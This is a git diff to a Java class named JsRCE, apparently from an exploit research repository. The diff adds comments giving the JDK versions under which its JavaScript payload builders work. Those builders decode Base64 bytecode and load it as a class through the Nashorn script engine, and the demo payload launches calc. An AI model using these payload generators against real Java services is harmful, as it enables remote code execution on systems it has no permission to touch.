@@ -38,7 +38,7 @@ public class JsRCE {
         ScriptEngineManager manager = new ScriptEngineManager();
         manager.getEngineByName("js").eval(getJsPayload5(Base64.getEncoder().encodeToString(getEvilCode("calc"))));
     }
-
+    //JDK<=11
     public static String getJsPayload3(String code) throws Exception {
         return "var data = '" + code + "';" +
                 "var bytes = java.util.Base64.getDecoder().decode(data);" +
@@ -57,6 +57,7 @@ public class JsRCE {
                 "java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length);" +
                 "cc.newInstance();";
     }
+    //jdk<=15
     public static String getJsPayload5(String code) throws Exception {
         return "var data = '" + code + "';" +
                 "var bytes = java.util.Base64.getDecoder().decode(data);" +
